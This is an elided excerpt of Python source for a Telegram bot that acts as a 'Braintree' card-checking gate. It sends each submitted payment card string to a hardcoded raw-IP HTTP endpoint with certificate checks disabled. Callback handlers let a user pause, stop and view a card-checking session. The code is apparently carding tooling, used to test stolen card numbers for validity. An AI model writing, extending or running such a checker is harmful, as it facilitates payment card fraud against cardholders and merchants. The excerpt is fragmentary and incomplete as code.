...
GATE_NAME = "Braintree"
GATE_CMD = "mb3"
B3_API = "http://5.83.136.66:8005/Braintree?cc={cc}"
active_sessions = {}
...
def process_single_card(card):
    try:
        resp = requests.get(B3_API.format(cc=card), timeout=90, verify=False)
        if resp.status_code == 200:
            data = resp.json()
...
async def mb3_command(message: types.Message):
...
@router.callback_query(F.data.startswith("mb3_card_"))
async def mb3_card_callback(callback: types.CallbackQuery):
...
@router.callback_query(F.data.startswith("mb3_response_"))
async def mb3_response_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mb3_stop_"))
async def mb3_stop_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mb3_pause_"))
async def mb3_pause_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
